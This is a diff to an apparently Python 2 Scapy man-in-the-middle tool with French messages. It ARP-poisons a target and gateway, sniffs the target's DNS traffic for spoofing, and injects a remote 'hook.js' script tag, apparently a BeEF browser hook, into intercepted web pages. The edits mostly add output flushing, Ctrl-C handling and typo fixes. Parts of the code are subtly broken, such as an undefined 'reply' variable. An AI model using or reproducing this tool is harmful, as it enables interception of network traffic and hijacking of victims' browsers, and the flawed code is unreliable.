@@ -6,7 +6,7 @@ from scapy.all import *
 import subprocess
 import threading
 import time
-import os
+import os, sys
 import re
 
 class HostUnreachable(Exception):
@@ -45,7 +45,7 @@ class MITM(object):
                         print "Passerelle trouvée: ", route[1]
                         return route[1]
 
-            except: print "Impossible de déterminer la passerelle par défaut."
+            except: print "Impossible de déterminer la passerelle par défaut." ; sys.stdout.flush()
             # print "test", netstat
         else: self.findGateway()
 
@@ -62,31 +62,38 @@ class MITM(object):
         r = srp1(ping, timeout=.5, verbose=0)
         if r == None:
             print '.',
+            sys.stdout.flush()
             return False
         else:
             print "\nSuccessfull MITM"
             print self.gateway + "-> unknown MAC"
             print "\t\\\n\t \\\n\t  \\\n\tlocalhost -> " + r[Ether].dst + "\n\t  /\n\t /\n\t/"
             print r[IP].src, '->', r[Ether].src
+            print "Interception is in progress..."
+            sys.stdout.flush()
             self.MAC[r[IP].src] = r[Ether].src
             return True
 
-    def arpPoisoning(self):
+    def arpPoisoning(self) :
         p1 = Ether(dst=self.MAC[self.target]) / ARP(op="who-has", psrc=self.gateway, pdst=self.target)
         p2 = Ether() / ARP(op="who-has", psrc=self.target, pdst=self.gateway)
         # Poisonning talbe
         # sendp(p, inter=0.!5, count=100, verbose=0)
         # Mainting spoofing
-        print "Poisoning"
+        print "Poisoning", ; sys.stdout.flush()
         while True:
-            sendp(p1, count=1, verbose=0)
-            sendp(p2, count=1, verbose=0)
-            if not self.hooked: self.hooked = self.fakeping(frm=self.gateway, to=self.target)
-            else:
-                self.beefSpoof()
-                # self.dnsSpoof()
-                time.sleep(1)
-
+            try :
+                sendp(p1, count=1, verbose=0)
+                sendp(p2, count=1, verbose=0)
+                if not self.hooked: self.hooked = self.fakeping(frm=self.gateway, to=self.target)
+                else:
+                    # self.beefSpoof()
+                    # self.dnsSpoof()
+                    time.sleep(1)
+            except KeyboardInterrupt :
+                print "Stopping"
+                sys.stdout.flush()
+                sys.exit()
     def dnsSpoof(self):
         sniff(filter="udp port 53 and ip src " + self.target, prn=self.fakeDNS)
 
@@ -95,7 +102,7 @@ class MITM(object):
 
     def injectBeef(self, pkt):
         print pkt.summary()
-        if (TCP in pkt and pkt[TCP].flags & mitm.ACK and reply.haslayer(Raw)) and self.hooked:
+        if (TCP in pkt and pkt[TCP].flags & MITM.ACK and reply.haslayer(Raw)) and self.hooked:
             if "</head>" in pkt[Raw].load:
                 spfResp = IP(src=pkt[IP].src, dst=pkt[IP].dst) / TCP(sport=80, dport=pkt[TCP].dport, flags=pkt[TCP].flags) / Raw()
                 spfResp[Raw].load = spfResp[Raw].load.replace('</head>', '<script src="' + self.gateway + ':3000/hook.js"></script></head>')
@@ -103,7 +110,7 @@ class MITM(object):
                 return "Hook sent !"
 
             else:
-                return self.send(pkt, verbos=0)
+                return self.send(pkt, verbose=0)
         else:
             return False
 
